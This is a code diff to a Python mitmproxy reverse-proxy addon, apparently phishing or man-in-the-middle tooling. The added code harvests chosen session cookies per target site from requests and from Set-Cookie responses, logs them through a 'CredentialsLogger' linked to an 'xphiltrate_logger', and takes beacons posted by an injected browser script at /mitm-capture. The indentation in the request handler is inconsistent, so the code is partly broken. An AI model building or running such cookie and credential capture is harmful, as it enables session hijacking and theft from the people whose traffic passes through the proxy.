@@ -1,3 +1,4 @@
+# mitm main reverse proxy
 import argparse
 import asyncio
 import json
@@ -71,28 +72,51 @@ class ReverseProxyAddon:
         self.logger = CredentialsLogger()
 
     def request(self, flow: http.HTTPFlow):
-        if flow.request.path == "/mitm-capture":
-            if flow.request.method == "POST":
-                try:
-                    body = json.loads(flow.request.get_text())
-                    self.logger.process_event(
-                        f"JS_CAPTURE_{body.get('type', 'UNK').upper()}",
-                        body.get("url", flow.request.pretty_url),
-                        "POST",
-                        body.get("payload", {})
-                    )
-                except Exception as e:
-                    logging.warning(f"Capture parse error: {e}")
-            flow.response = http.Response.make(204, b"", {
-                "Access-Control-Allow-Origin": "*",
-                "Access-Control-Allow-Headers": "Content-Type",
-            })
-            return
+            # Handle JS Injection Captures (from INJECTED_SCRIPT)
+            if flow.request.path == "/mitm-capture":
+                if flow.request.method == "POST":
+                    try:
+                        body = json.loads(flow.request.get_text())
+                        self.logger.process_event(
+                            f"JS_CAPTURE_{body.get('type', 'UNK').upper()}",
+                            body.get("url", flow.request.pretty_url),
+                            "POST",
+                            body.get("payload", {})
+                        )
+                    except Exception as e:
+                        logging.warning(f"Capture parse error: {e}")
+                
+                # Respond to the beacon immediately
+                flow.response = http.Response.make(204, b"", {
+                    "Access-Control-Allow-Origin": "*",
+                    "Access-Control-Allow-Headers": "Content-Type",
+                })
+                return
 
-        flow.request.host   = self.target_host
-        flow.request.port   = self.target_port
-        flow.request.scheme = self.target_scheme
-        flow.request.headers["host"] = self.parsed.netloc
+            # Capture Cookies based on site_mapping.json - integratiotn with xphiltrate_logger on 4/5
+            target_host = flow.request.pretty_host
+            if target_host in self.logger.site_specific_mappings:
+                relevant_keys = self.logger.site_specific_mappings[target_host]
+                captured_cookies = {}
+                
+                for cookie_name in relevant_keys:
+                    if cookie_name in flow.request.cookies:
+                        captured_cookies[cookie_name] = flow.request.cookies[cookie_name]
+                
+                if captured_cookies:
+                    self.logger.process_event(
+                        "HEADER_COOKIE_CAPTURE", 
+                        flow.request.pretty_url, 
+                        "COOKIE", 
+                        captured_cookies
+                    )
+
+            # Reverse Proxy Forwarding Logic
+            # This ensures the request actually reaches your Ngrok/Localhost site
+            flow.request.host   = self.target_host
+            flow.request.port   = self.target_port
+            flow.request.scheme = self.target_scheme
+            flow.request.headers["host"] = self.parsed.netloc
 
     def response(self, flow: http.HTTPFlow):
         resp = flow.response
@@ -111,6 +135,18 @@ class ReverseProxyAddon:
                 resp.set_text(text)
             except:
                 pass
+
+        # Capture cookies from server response - integratiotn with xphiltrate_logger on 4/5
+        target_host = flow.request.pretty_host
+        if target_host in self.logger.site_specific_mappings:
+            target_cookies = self.logger.site_specific_mappings[target_host]
+            captured_set_cookies = {}
+            for cookie_name in target_cookies:
+                if cookie_name in flow.response.cookies:
+                    captured_set_cookies[cookie_name] = flow.response.cookies[cookie_name][0] 
+
+            if captured_set_cookies:
+                self.logger.process_event("SET_COOKIE_CAPTURE", flow.request.url, "SET-COOKIE", captured_set_cookies)
 
 def main():
     parser = argparse.ArgumentParser()
